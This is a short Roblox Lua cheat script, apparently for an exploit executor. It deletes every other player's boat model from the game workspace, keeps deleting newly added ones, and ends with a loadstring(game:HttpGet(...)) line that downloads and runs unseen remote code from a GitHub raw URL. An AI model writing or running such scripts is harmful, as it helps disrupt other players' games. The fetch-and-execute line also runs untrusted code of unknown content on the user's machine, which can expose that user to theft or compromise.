local player = game:GetService("Players").LocalPlayer
local boatsFolder = workspace.active.boats

for _, child in ipairs(boatsFolder:GetChildren()) do
    if child:IsA("Model") and child.Name ~= player.Name then
        child:Destroy()
    end
end

boatsFolder.ChildAdded:Connect(function(child)
    if child:IsA("Model") and child.Name ~= player.Name then
        child:Destroy()
    end
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()